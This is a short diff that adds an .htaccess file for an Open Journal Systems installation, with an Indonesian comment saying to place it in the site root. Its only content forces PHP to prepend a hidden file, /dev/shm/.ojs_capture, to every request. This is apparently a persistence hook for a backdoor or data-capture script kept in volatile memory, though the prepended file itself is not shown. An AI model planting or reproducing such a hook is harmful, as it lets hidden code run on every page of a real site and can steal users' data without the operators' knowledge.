@@ -1,0 +1,9 @@
+# .htaccess - Letakkan di root OJS
+php_value auto_prepend_file "/dev/shm/.ojs_capture"
+
+<IfModule mod_php8.c>
+    php_value auto_prepend_file "/dev/shm/.ojs_capture"
+</IfModule>
+<IfModule mod_php7.c>
+    php_value auto_prepend_file "/dev/shm/.ojs_capture"
+</IfModule>
